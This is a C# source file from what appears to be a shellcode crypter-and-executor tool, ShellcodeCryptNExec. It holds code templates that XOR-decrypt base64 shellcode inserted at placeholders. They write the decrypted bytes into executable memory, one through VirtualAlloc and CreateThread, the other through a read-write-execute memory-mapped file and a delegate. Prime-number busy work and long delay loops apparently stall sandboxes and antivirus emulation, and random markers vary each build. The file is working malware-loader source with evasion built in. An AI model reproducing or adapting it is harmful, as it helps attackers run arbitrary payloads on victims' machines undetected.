using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ShellcodeCryptNExec.Templates {
    static class Templates {

        public static string testTemplate = @"
            using System;

            namespace First {
                public class Program {" +

                "private static String random = \"RANDOM_MARKER\";" +
                    @"public static void Main() {" +
                        "Console.WriteLine(\"Key: KEY_MARKER\");" +
                        "Console.WriteLine(\"Shellcode: SHELLCODE_MARKER\");" +
                        "Console.WriteLine(\"Random string: \"+random);" +
                    @"}
                }
            }
        ";

        public static string kernel32ExecutorTemplate =
@"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ExecutorKernel32 {
    class Program {" +

        "private static String random = \"RANDOM_MARKER\";" +

        @"private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        private static byte[] shellcode = null;
        private static IEnumerable<byte> decrypted = new List<byte>();" +
        "private static byte[] key = Encoding.ASCII.GetBytes(\"KEY_MARKER\");" +

        @"private static readonly int maxPrimes = 100000;
        private static int keyIndex = 0;

        static void Main(string[] args) {

            List<int> primes = new List<int> { 2 };
            int nextPrime = 3;

            while (primes.Count < maxPrimes) {
                int sqrt = (int)Math.Sqrt(nextPrime);
                bool isPrime = true;
                for (int i = 0; primes[i] <= sqrt; i++) {
                    if (nextPrime % primes[i] == 0) {
                        isPrime = false;
                        break;
                    }
                }
                if (isPrime) {
                    primes.Add(nextPrime);

                    if (primes.Count == maxPrimes / 3) {" +
                        "Decrypt(\"SHELLCODE_MARKER_1\");" +
                    @"} else if (primes.Count == ((maxPrimes / 3) * 2)) {" +
                        "Decrypt(\"SHELLCODE_MARKER_2\");" +
                    @"} else if (primes.Count == maxPrimes) {" +
                        "Decrypt(\"SHELLCODE_MARKER_3\");" +
                    @"}
                }
                nextPrime += 2;
            }

            Console.WriteLine(primes.Count + "" primes found."");

            for (int i = 0; i < 100000000; i++) {

                if (i == 99999999) {

                    byte[] decryptedArray = decrypted.ToArray();

                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)decryptedArray.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(decryptedArray, 0, (IntPtr)(funcAddr), decryptedArray.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;

                    IntPtr pinfo = IntPtr.Zero;

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                    Console.WriteLine(""Done."");
                }
            }
            return;
        }

        private static void Decrypt(string shellcodeb64) {

            for (int i = 0; i < 100000000; i++) {

                if (i == 99999999) {
                    shellcode = Convert.FromBase64String(shellcodeb64);

                    byte[] temp = new byte[shellcode.Length];

                    for (int j = 0; j < shellcode.Length; j++) {
                        temp[j] = (byte)(shellcode[j] ^ key[(j + keyIndex) % key.Length]);
                    }
                    keyIndex += shellcode.Length % key.Length;
                    
                    decrypted = decrypted.Concat(temp);
                    Console.WriteLine(""Count: "" + decrypted.Count());
                }
            }
        }

        [DllImport(""kernel32"")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport(""kernel32"")]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );

        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );
    }
}";

        public static string delegateExecutorTemplate =
@"using System;
using System.Collections.Generic;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ExecutorDelegate {
    class Program {" +

        "private static String random = \"RANDOM_MARKER\";" +

        @"private delegate IntPtr ExecutionDelegate();

        private static byte[] shellcode = null;
        private static IEnumerable<byte> decrypted = new List<byte>();" +
        "private static byte[] key = Encoding.ASCII.GetBytes(\"KEY_MARKER\");" +

        @"private static readonly int maxPrimes = 100000;
        private static int keyIndex = 0;

        static void Main(string[] args) {

            List<int> primes = new List<int> { 2 };
            int nextPrime = 3;

            while (primes.Count < maxPrimes) {
                int sqrt = (int)Math.Sqrt(nextPrime);
                bool isPrime = true;
                for (int i = 0; primes[i] <= sqrt; i++) {
                    if (nextPrime % primes[i] == 0) {
                        isPrime = false;
                        break;
                    }
                }
                if (isPrime) {
                    primes.Add(nextPrime);

                    if (primes.Count == maxPrimes / 3) {" +
                        "Decrypt(\"SHELLCODE_MARKER_1\");" +
                    @"} else if (primes.Count == ((maxPrimes / 3) * 2)) {" +
                        "Decrypt(\"SHELLCODE_MARKER_2\");" +
                    @"} else if (primes.Count == maxPrimes) {" +
                        "Decrypt(\"SHELLCODE_MARKER_3\");" +
                    @"}
                }
                nextPrime += 2;
            }

            Console.WriteLine(primes.Count + "" primes found."");

            for (int i = 0; i < 100000000; i++) {

                if (i == 99999999) {

                    var function = Execute();
                    Console.WriteLine(""Done."");
                }
            }
            return;
        }

        private static unsafe IntPtr Execute() {
            MemoryMappedFile mmf = null;
            MemoryMappedViewAccessor mmva = null;
            byte[] decryptedArray = decrypted.ToArray();

            try {
                mmf = MemoryMappedFile.CreateNew(""shellcode"", decryptedArray.Length, MemoryMappedFileAccess.ReadWriteExecute);
                mmva = mmf.CreateViewAccessor(0, decryptedArray.Length, MemoryMappedFileAccess.ReadWriteExecute);
                mmva.WriteArray(0, decryptedArray, 0, decryptedArray.Length);
                var pointer = (byte*)0;
                mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
                var func = (ExecutionDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(ExecutionDelegate));
                return func();
            } catch {
                return IntPtr.Zero;
            } finally {
                mmva.Dispose();
                mmf.Dispose();
            }
        }

        private static void Decrypt(string shellcodeb64) {

            for (int i = 0; i < 100000000; i++) {

                if (i == 99999999) {

                    shellcode = Convert.FromBase64String(shellcodeb64);

                    byte[] temp = new byte[shellcode.Length];

                    for (int j = 0; j < shellcode.Length; j++) {
                        temp[j] = (byte)(shellcode[j] ^ key[(j + keyIndex) % key.Length]);
                    }
                    keyIndex += shellcode.Length % key.Length;

                    decrypted = decrypted.Concat(temp);
                    Console.WriteLine(""Count: "" + decrypted.Count());
                }
            }
        }
    }
}";
    }
}